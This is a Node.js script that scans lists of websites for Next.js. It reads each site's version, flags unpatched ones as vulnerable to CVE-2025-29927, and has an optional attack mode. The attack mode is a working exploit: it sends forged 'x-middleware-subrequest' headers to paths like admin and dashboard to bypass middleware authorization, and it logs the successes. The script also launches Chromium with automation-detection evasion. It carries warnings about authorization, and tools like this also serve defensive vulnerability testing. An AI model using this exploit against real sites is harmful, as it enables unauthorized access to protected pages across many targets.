'use strict';

const puppeteer = require('puppeteer');
const yargs = require('yargs/yargs');
const fs = require('fs');
const path = require('path');

const argv = yargs(process.argv.slice(2))
  .option('u', {
    alias: 'urls',
    description: 'URLs separated by spaces or commas',
    type: 'string'
  })
  .option('f', {
    alias: 'file',
    description: 'File containing one URL per line',
    type: 'string'
  })
  .option('c', {
    alias: 'chrome',
    description: 'Path to Chromium/Chrome executable',
    type: 'string',
    default: process.env.CHROMIUM_PATH || undefined
  })
  .option('o', {
    alias: 'output',
    description: 'Output file',
    type: 'string'
  })
  .option('v', {
    alias: 'verbose',
    description: 'Show detailed progress and results',
    type: 'boolean',
    default: false
  })
  .option('r', {
    alias: 'redirect',
    description: 'Follow redirects during active testing',
    type: 'boolean',
    default: false
  })
  .option('a', {
    alias: 'attack',
    description: 'Enable active security testing. Only use with authorization.',
    type: 'boolean',
    default: false
  })
  .option('w', {
    alias: 'wordlist',
    description: 'File containing paths for active testing',
    type: 'string'
  })
  .option('t', {
    alias: 'headless',
    description: 'Run Chromium in headless mode',
    type: 'boolean',
    default: false
  })
  .option('x', {
    alias: 'headers',
    description: 'Try the alternate middleware header pattern if the first test fails',
    type: 'boolean',
    default: false
  })
  .strict()
  .help()
  .alias('h', 'help')
  .parse();

const VERSIONS_PATCHED = [
  '15.2.3',
  '14.2.25',
  '13.5.9',
  '12.3.5'
];

const DEFAULT_USER_AGENT =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' +
  'AppleWebKit/537.36 (KHTML, like Gecko) ' +
  'Chrome/122.0.0.0 Safari/537.36';

const DEFAULT_WORDLIST = [
  'admin',
  'dashboard'
];

const REQUEST_TIMEOUT = 15000;


const vulnerableWebsites = [];
const exploitedSites = [];
const info = {};

function log(message, colorCode = '\x1b[0m') {
  if (!argv.verbose) {
    return;
  }

  process.stdout.write(
    `${colorCode}${message}\x1b[0m\n`
  );
}

function logError(message) {
  process.stderr.write(`${message}\n`);
}

function normalizeUrl(value) {
  if (!value || typeof value !== 'string') {
    return null;
  }

  let url = value.trim();

  if (!url) {
    return null;
  }


  if (!/^https?:\/\//i.test(url)) {
    url = `https://${url}`;
  }

  try {
    const parsed = new URL(url);

    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return null;
    }

    return parsed.toString();
  } catch {
    return null;
  }
}

function loadWebsites() {
  let websites = [];

  if (argv.u) {
    websites = argv.u
      .split(/[\s,]+/)
      .map(normalizeUrl)
      .filter(Boolean);
  } else if (argv.f) {
    const filePath = path.resolve(argv.f);

    if (!fs.existsSync(filePath)) {
      throw new Error(`URL file does not exist: ${filePath}`);
    }

    websites = fs
      .readFileSync(filePath, 'utf8')
      .split(/\r?\n/)
      .map(normalizeUrl)
      .filter(Boolean);
  }

  return [...new Set(websites)];
}


function getHostname(url) {
  try {
    return new URL(url).hostname;
  } catch {
    return url;
  }
}

function getCompanyName(url) {
  const hostname = getHostname(url)
    .replace(/^www\./i, '');

  const parts = hostname.split('.').filter(Boolean);

  if (parts.length >= 2) {
    return parts[parts.length - 2];
  }

  return hostname;
}

function createInfoEntry(url) {
  const hostname = getHostname(url);

  if (!info[hostname]) {
    info[hostname] = {
      url,
      hostname,
      company: getCompanyName(url),
      framework: '',
      version: '',
      result: '',
      exploitedUrls: [],
      errors: []
    };
  }

  return info[hostname];
}

function addError(url, error, description) {
  const entry = createInfoEntry(url);

  entry.errors.push({
    message: error?.message || String(error),
    code: error?.code || null,
    info: description
  });
}

function parseVersion(version) {
  if (!version || typeof version !== 'string') {
    return null;
  }

  const match = version.trim().match(
    /^v?(\d+)\.(\d+)\.(\d+)(?:[-+].*)?$/
  );

  if (!match) {
    return null;
  }

  return {
    major: Number(match[1]),
    minor: Number(match[2]),
    patch: Number(match[3])
  };
}

function compareVersions(a, b) {
  const av = parseVersion(a);
  const bv = parseVersion(b);

  if (!av || !bv) {
    return null;
  }

  if (av.major !== bv.major) {
    return av.major - bv.major;
  }

  if (av.minor !== bv.minor) {
    return av.minor - bv.minor;
  }

  return av.patch - bv.patch;
}

function isPatchedVersion(version) {
  const parsed = parseVersion(version);

  if (!parsed) {
    return false;
  }

  const patchedForMajor = VERSIONS_PATCHED.find(
    patched => parseVersion(patched)?.major === parsed.major
  );

  if (!patchedForMajor) {
    return false;
  }

  return compareVersions(version, patchedForMajor) >= 0;
}

async function fetchWithTimeout(url, options = {}) {
  const controller = new AbortController();

  const timeout = setTimeout(() => {
    controller.abort();
  }, REQUEST_TIMEOUT);

  try {
    return await fetch(url, {
      ...options,
      signal: controller.signal
    });
  } finally {
    clearTimeout(timeout);
  }
}


async function checkFrameWork(url) {
  const entry = createInfoEntry(url);

  try {
    const response = await fetchWithTimeout(url, {
      method: 'GET',
      redirect: 'manual',
      headers: {
        'user-agent': DEFAULT_USER_AGENT,
        accept: 'text/html,application/xhtml+xml'
      }
    });

    const headers = Object.fromEntries(
      response.headers.entries()
    );

    const body = await response.text();

    const poweredByNext =
      headers['x-powered-by']?.toLowerCase() === 'next.js';

    const hasNextData =
      body.includes('__NEXT_DATA__');

    const matchesNextPaths =
      body.match(/\/_next\/[^"'\\\s<]+/g) || [];

    const linkHeader =
      headers.link || '';

    const preloadsNext =
      linkHeader.includes('/_next/');

    const hasNextScript =
      /\/_next\/static\//i.test(body);

    const isLikelyNext =
      poweredByNext ||
      hasNextData ||
      matchesNextPaths.length > 0 ||
      preloadsNext ||
      hasNextScript;

    if (isLikelyNext) {
      entry.framework = 'Next.js';

      log(
        `${url} appears to use Next.js`,
        '\x1b[36m'
      );

      return true;
    }

    entry.framework = 'Unknown';

    log(
      `${url} does not appear to use Next.js`,
      '\x1b[32m'
    );

    return false;

  } catch (error) {
    addError(
      url,
      error,
      `Error detecting framework for ${url}`
    );

    return null;
  }
}

async function checkNextJsVersion(url, browser) {
  const entry = createInfoEntry(url);

  let page;

  try {
    page = await browser.newPage();

    await page.setUserAgent(DEFAULT_USER_AGENT);

    await page.goto(url, {
      waitUntil: 'domcontentloaded',
      timeout: REQUEST_TIMEOUT
    });

    const nextVersion = await page.evaluate(() => {
      try {
        if (
          window.next &&
          typeof window.next.version === 'string'
        ) {
          return window.next.version;
        }

        return null;
      } catch {
        return null;
      }
    });

    entry.version = nextVersion || 'not found';

    if (!nextVersion) {
      entry.result = 'Potentially Vulnerable - Version Not Detected';

      vulnerableWebsites.push({
        url,
        version: null
      });

      log(
        `${url} - Next.js detected but version could not be determined. ` +
        'Potentially vulnerable.',
        '\x1b[31m'
      );

      return;
    }

    if (isPatchedVersion(nextVersion)) {
      entry.result = 'Patched Version';

      log(
        `${url} is using patched Next.js version ${nextVersion}`,
        '\x1b[32m'
      );

      return;
    }

    entry.result = 'Potentially Vulnerable';

    vulnerableWebsites.push({
      url,
      version: nextVersion
    });

    log(
      `${url} is running Next.js ${nextVersion}. ` +
      'Potentially vulnerable to CVE-2025-29927.',
      '\x1b[31m'
    );

  } catch (error) {
    addError(
      url,
      error,
      `Error checking Next.js version for ${url}`
    );

  } finally {
    if (page) {
      try {
        await page.close();
      } catch {
        // Ignore page-close errors.
      }
    }
  }
}

function loadWordlist() {
  if (!argv.wordlist) {
    return DEFAULT_WORDLIST;
  }

  const filePath = path.resolve(argv.wordlist);

  if (!fs.existsSync(filePath)) {
    throw new Error(`Wordlist does not exist: ${filePath}`);
  }

  const words = fs
    .readFileSync(filePath, 'utf8')
    .split(/\r?\n/)
    .map(value => value.trim())
    .filter(Boolean);

  if (!words.length) {
    throw new Error('The supplied wordlist is empty.');
  }

  return words;
}

function normalizePath(value) {
  let result = value.trim();

  if (!result) {
    return null;
  }

  result = result.replace(/^\/+/, '');

  return result;
}

async function activeTest(url, headerValue, wordlist) {
  const entry = createInfoEntry(url);

  log(
    `Starting authorized active testing against ${url}`,
    '\x1b[33m'
  );

  for (const rawPath of wordlist) {
    const targetPath = normalizePath(rawPath);

    if (!targetPath) {
      continue;
    }

    let exploitUrl;

    try {
      exploitUrl = new URL(
        targetPath,
        url.endsWith('/') ? url : `${url}/`
      ).toString();
    } catch (error) {
      addError(
        url,
        error,
        `Unable to construct test URL from ${targetPath}`
      );

      continue;
    }

    try {
      const response = await fetchWithTimeout(
        exploitUrl,
        {
          method: 'GET',
          headers: {
            'user-agent': DEFAULT_USER_AGENT,
            'x-middleware-subrequest': headerValue
          },
          redirect: argv.redirect ? 'follow' : 'manual',
          keepalive: false
        }
      );

      if (response.status === 200) {
        if (!entry.exploitedUrls.includes(exploitUrl)) {
          entry.exploitedUrls.push(exploitUrl);
        }

        exploitedSites.push({
          url: exploitUrl,
          status: response.status,
          header: headerValue
        });

        entry.result = 'Active Test Positive';

        log(
          `Active test returned HTTP 200: ${exploitUrl}`,
          '\x1b[31m'
        );
      } else {
        log(
          `Active test ${exploitUrl} returned HTTP ${response.status}`,
          '\x1b[90m'
        );
      }

    } catch (error) {
      addError(
        url,
        error,
        `Error during active test against ${exploitUrl}`
      );
    }
  }
}

async function attack(url, wordlist) {
  await activeTest(
    url,
    'middleware:middleware:middleware:middleware:middleware',
    wordlist
  );

  const hostname = getHostname(url);
  const entry = info[hostname];

  if (
    argv.headers &&
    entry &&
    entry.exploitedUrls.length === 0
  ) {
    await activeTest(
      url,
      'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware',
      wordlist
    );
  }
}

async function launchBrowser() {
  const options = {
    headless: argv.headless ? 'new' : false,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-blink-features=AutomationControlled',
      '--start-maximized'
    ],
    defaultViewport: null
  };

  if (argv.chrome) {
    options.executablePath = argv.chrome;
  }

  return puppeteer.launch(options);
}

async function checkWebsites(websites) {
  log('\nStarting security analysis...\n');

  let browser;

  try {
    browser = await launchBrowser();

    const tasks = websites.map(async url => {
      log(`Analysing: ${url}`);

      const usesNextJs = await checkFrameWork(url);

      if (usesNextJs !== true) {
        return;
      }

      log(`Checking Next.js version of ${url}`);

      await checkNextJsVersion(
        url,
        browser
      );
    });

    await Promise.allSettled(tasks);

  } finally {
    if (browser) {
      try {
        await browser.close();
      } catch (e) {
        console.error(`Browser Error: \n`, e);
      }
    }
  }

  if (argv.attack && vulnerableWebsites.length) {
    const wordlist = loadWordlist();

    log(
      '\nActive testing enabled. Only continue if you are authorized to test these targets.\n',
      '\x1b[33m'
    );

    const attacks = vulnerableWebsites.map(
      async ({ url }) => {
        await attack(url, wordlist);
      }
    );

    await Promise.allSettled(attacks);
  }
}

function getResults() {
  return argv.attack
    ? exploitedSites
    : vulnerableWebsites;
}

function printFinalResults() {
  const results = getResults();

  if (argv.verbose) {
    process.stdout.write('\nFinal Results\n\n');

    process.stdout.write(
      `Potentially Vulnerable Sites: ${vulnerableWebsites.length}\n`
    );

    if (argv.attack) {
      process.stdout.write(
        `Active Test Positive Results: ${exploitedSites.length}\n`
      );
    }

    if (results.length) {
      for (const result of results) {
        if (typeof result === 'string') {
          process.stdout.write(`${result}\n`);
        } else {
          process.stdout.write(
            `${JSON.stringify(result)}\n`
          );
        }
      }
    } else {
      process.stdout.write('No matching results.\n');
    }

    return;
  }

  process.stdout.write(
    `${JSON.stringify(info, null, 2)}\n`
  );
}

function writeOutputFile() {
  if (!argv.output) {
    return;
  }

  const outputPath = path.resolve(argv.output);

  if (argv.verbose) {
    const results = getResults();

    const content = results
      .map(result => {
        if (typeof result === 'string') {
          return result;
        }

        if (result.url) {
          return result.version
            ? `${result.url} -> version: ${result.version}`
            : result.url;
        }

        return JSON.stringify(result);
      })
      .join('\n');

    fs.writeFileSync(
      outputPath,
      content,
      'utf8'
    );

    return;
  }

  fs.writeFileSync(
    outputPath,
    JSON.stringify(info, null, 2),
    'utf8'
  );
}

async function main() {
  const websites = loadWebsites();

  if (!websites.length) {
    throw new Error(
      'No URLs provided. Use --urls/-u or --file/-f.'
    );
  }

  log(
    `Loaded ${websites.length} unique target(s).`,
    '\x1b[36m'
  );

  await checkWebsites(websites);

  printFinalResults();
  writeOutputFile();
}

process.on('SIGINT', () => {
  logError('\nScan interrupted.');
  process.exit(130);
});

process.on('SIGTERM', () => {
  logError('\nScan terminated.');
  process.exit(143);
});

main()
  .catch(error => {
    logError(
      `Fatal error: ${error.message || error}`
    );

    if (argv.verbose && error.stack) {
      logError(error.stack);
    }

    process.exitCode = 1;
  });
